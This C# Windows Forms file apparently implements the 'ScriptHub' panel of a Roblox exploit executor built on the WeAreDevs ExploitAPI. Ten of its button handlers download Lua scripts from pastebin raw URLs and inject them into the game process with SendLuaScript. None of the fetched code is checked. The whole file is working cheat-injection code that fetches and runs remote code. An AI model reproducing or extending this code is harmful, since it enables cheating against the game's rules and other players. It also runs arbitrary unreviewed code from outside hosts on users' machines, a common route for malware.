using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using WeAreDevs_API;

namespace Xeno
{
    public partial class ScriptHub: Form
    {
        ExploitAPI module = new ExploitAPI();
        public ScriptHub()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/xNGr7TRY");
            module.SendLuaScript(Script);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/WN3Bt1ut");
            module.SendLuaScript(Script);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/bvzmZ7Qw");
            module.SendLuaScript(Script);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/KJssEiJc");
            module.SendLuaScript(Script);
        }

        private void button5_Click(object sender, EventArgs e)
        {

        }

        private void button6_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/0iAU0Nf0");
            module.SendLuaScript(Script);
        }

        private void button7_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/cGdF12JU");
            module.SendLuaScript(Script);
        }

        private void button8_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/TjeVqzGj");
            module.SendLuaScript(Script);
        }

        private void button12_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/Wf8984tZ");
            module.SendLuaScript(Script);
        }

        private void button11_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/tSx0A5Yh");
            module.SendLuaScript(Script);
        }

        private void button10_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/x1zcWfws");
            module.SendLuaScript(Script);
        }

        private void button9_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/qt0CvY9e");
            module.SendLuaScript(Script);
        }
    }
}
